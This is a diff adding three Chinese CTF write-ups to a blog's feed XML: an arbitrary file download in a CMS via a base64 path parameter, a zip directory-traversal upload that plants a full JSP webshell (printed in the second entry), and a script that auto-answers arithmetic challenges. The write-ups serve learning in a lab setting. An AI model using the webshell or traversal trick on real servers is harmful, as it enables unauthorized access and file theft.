@@ -4,6 +4,81 @@
   
     
     <entry>
+      <title>日常练习44——任意文件下载和cms</title>
+      <link href="test95/undefined-undefined.html"/>
+      <url>test95/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>任意文件下载算是一个小的简单的知识点，但是之前没有总结过，这次总结一下。</p><p>以一道题为例：  </p><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>这道题题目就给出了考点，考的是网站cms，这个cms也不是第一次见了，cms指的是内容管理系统，也可以理解成为网站建设系统。简单来说如果考这个点，也就是考验能否找到这个网站建设系统的漏洞，而有的网站漏洞可以在网上搜到，从而直接拿网上公开的exp来用，有的cms则需要自己找到漏洞来利用。  </p><p>这道题考的cms漏洞有两个，分别是任意文件下载漏洞和文件上传漏洞。重点总结一下任意文件下载漏洞。  </p><p>题目直接给出提示后台密码为五位弱口令，那么直接找到admin.php页面，用户名和密码为admin/12345，发现可以直接登录。  </p><p><a href="https://pic.imgdb.cn/item/61dc0db72ab3f51d91c5ca8c.png"><img src="https://pic.imgdb.cn/item/61dc0db72ab3f51d91c5ca8c.png"></a>  </p><p>登陆后台后我们直接先找可以上传文件的地方，找到设计-主题-自定义-导出主题-保存，信息随便填写，然后会弹出刚刚我们保存的文件下载，下载后我们对下载链接进行研究。 </p><p><a href="https://pic.imgdb.cn/item/61dc0e922ab3f51d91c66af6.png"><img src="https://pic.imgdb.cn/item/61dc0e922ab3f51d91c66af6.png"></a> </p><pre><code>http://6ab05508-1de6-480e-853d-86e2a922b546.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTIzLnppcA==  </code></pre><p>很明显url进行了base64加密，而且可以看到这个url结构很明显简单，对theme的信息解码后得到  </p><pre><code>/var/www/html/system/tmp/theme/default/123.zip  </code></pre><p>结合题目中提示flag在根目录下，我们可以推测存在文件任意下载漏洞，将这个路径替换为/flag，再base64加密一下，得到新的下载url：  </p><pre><code>http://6ab05508-1de6-480e-853d-86e2a922b546.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=  </code></pre><p>发现可以正常使用  </p><p><a href="https://pic.imgdb.cn/item/61dc110e2ab3f51d91c8388e.png"><img src="https://pic.imgdb.cn/item/61dc110e2ab3f51d91c8388e.png"></a>  </p><p>得到flag文件，是zip格式，但是无法直接打开，改成txt格式后可以打开得到falg。  </p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>任意文件下载漏洞主要是在下载的url上做文章，如果下载的url结构过于简单并且没有进行权限的规范，那么就会造成任意文件下载的漏洞，使其他人未经允许便可以下载网站重要文件。这个知识点很简单，并且也不经常出现，这道题主要还是对cms这一比较新的知识点进行初步了解，以后遇到新的有关cms的题有所准备。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test95 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>金盾杯web-wp</title>
+      <link href="test94/undefined-undefined.html"/>
+      <url>test94/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="上传你的压缩包"><a href="#上传你的压缩包" class="headerlink" title="上传你的压缩包"></a>上传你的压缩包</h2><p>让上传一个zip格式的压缩包，先测试上传一个正常的返回上传的路径</p><p><a href="https://pic.imgdb.cn/item/61b5c4802ab3f51d9190a274.png"><img src="https://pic.imgdb.cn/item/61b5c4802ab3f51d9190a274.png"></a></p><p>看到路径是网站根目录下ROOT/upload/随机文件名，f12可以得到提示。提示压缩包上传后会解压到当前目录。  </p><p>由此可以知道上传的原理：先将上传的压缩包解压，然后对解压的文件进行筛选，文件名符合白名单的可以留下，不符合的删掉，所以假如直接将一句话木马放入压缩包中，那么在经过解压后我们是没有办法访问这个文件的。  </p><p>所以我们要在解压的时候将我们的一句话木马解压至别的目录下，以此来逃过对文件的筛查。也就是要进行目录穿越。  </p><p>因为我们要到根目录下，所以只需要穿越一层目录即可，根据此题目环境，要使用jsp一句话木马。  </p><p>jsp一句话木马  </p><pre><code>&lt;%!class U extends ClassLoader &#123;    U(ClassLoader c) &#123;        super(c);    &#125;    public Class g(byte[] b) &#123;        return super.defineClass(b, 0, b.length);    &#125;&#125;public byte[] base64Decode(String str) throws Exception &#123;    try &#123;        Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);        return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);    &#125; catch (Exception e) &#123;        Class clazz = Class.forName(&quot;java.util.Base64&quot;);        Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);        return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);    &#125;&#125;%&gt;&lt;%String cls = request.getParameter(&quot;passwd&quot;);if (cls != null) &#123;    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);&#125;%&gt;  </code></pre><p>构造文件名  </p><blockquote><p>/../feng.jsp</p></blockquote><p>该文件名长度为12位。因为文件名不能包含“/”等字符，所以我们利用010 Editor来修改  </p><p>首先将文件名命名为123456789012（这里和我们构造的文件名长度要一样）  </p><p>然后将这个文件和另一个任意正常文件一起添加到123456789012.zip压缩包中，这里来保证穿越文件利用成功。（不添加另一个文件能否成功没有测试）。  </p><p>然后将压缩包丢进010 Editor中，找到start不为0的且值为123456789012数据中的char deFileName一栏（会有两个123456789012）将值修改为我们构造的文件名/../feng.jsp。  </p><p><a href="https://pic.imgdb.cn/item/61b5c9632ab3f51d919569e2.png"><img src="https://pic.imgdb.cn/item/61b5c9632ab3f51d919569e2.png"></a>  </p><p>保存修改后发送这个zip文件，可以得到成功上传和上传的路径，此时我们的jsp一句话木马已经绕过检查，穿越目录到网站根目录下，然后通过剑蚁便可以成功连接，flag就在上传的根目录下。  </p><p><a href="https://pic.imgdb.cn/item/61b5cab82ab3f51d9196b0de.png"><img src="https://pic.imgdb.cn/item/61b5cab82ab3f51d9196b0de.png"></a>  </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test94 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习43</title>
+      <link href="test93/undefined-undefined.html"/>
+      <url>test93/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>最近开学上网课，学校事情较多，所以没有太多时间学习新的知识，做了一道题。  </p><h1 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h1><p>打开题目发现就是让我们算数，算对1000道就给flag。  </p><p><a href="https://pic.imgdb.cn/item/6138066344eaada7391bbe98.png"><img src="https://pic.imgdb.cn/item/6138066344eaada7391bbe98.png"></a>  </p><p>但是看到这个难度就知道是不可能自己算的，所以要借助脚本来实现。  </p><pre><code>import reimport requestsfrom time import sleepdef count():s = requests.session()url = &#39;http://c39b6aaa-4d51-4b1d-b777-32741c72ccc8.node3.buuoj.cn/&#39;match = re.compile(r&quot;[0-9]+ [+|-] [0-9]+&quot;)r = s.get(url)for i in range(1001):    sleep(0.1)    str = match.findall(r.text)[0]    # print(eval(str))    data = &#123;&quot;answer&quot; : eval(str)&#125;    r = s.post(url, data=data)    r.encoding = &quot;utf-8&quot;    print(&#39;&#123;&#125; : &#123;&#125;&#39;.format(i,eval(str)))    # print(r.text)print(r.text)if __name__ == &#39;__main__&#39;:count()  </code></pre><p>第一千次就给出flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题就是考察一个脚本编写能力，题目不难。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test93 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SOAP安全问题和session反序列化</title>
       <link href="test92/undefined-undefined.html"/>
       <url>test92/undefined-undefined.html</url>
